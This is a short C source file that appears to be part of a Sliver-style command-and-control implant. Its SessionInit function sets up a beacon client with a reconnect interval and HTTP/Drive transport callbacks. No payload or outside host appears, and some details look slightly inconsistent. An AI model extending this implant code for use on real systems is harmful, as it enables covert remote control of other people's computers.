#include "pch.h"

PSLIVER_SESSION_CLIENT SessionInit
(
	_In_ PGLOBAL_CONFIG pGlobalConfig
)
{
	PSLIVER_SESSION_CLIENT pBeaconClient = NULL;
	UINT64 uReconnectDuration = 300;

	pBeaconClient = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
	pBeaconClient->uReconnectDuration = uReconnectDuration;
	memcpy(&pBeaconClient->GlobalConfig, pGlobalConfig, sizeof(GLOBAL_CONFIG));
#ifdef __HTTP__
	pBeaconClient->Init = (CLIENT_INIT)HttpInit;
	pBeaconClient->Start = DriveStart;
	pBeaconClient->Send = HttpSend;
	pBeaconClient->Receive = DriveRecv;
	pBeaconClient->Close = DriveClose;
	pBeaconClient->Cleanup = FreeDriveClient;
#else
#endif

CLEANUP:
	return pBeaconClient;
}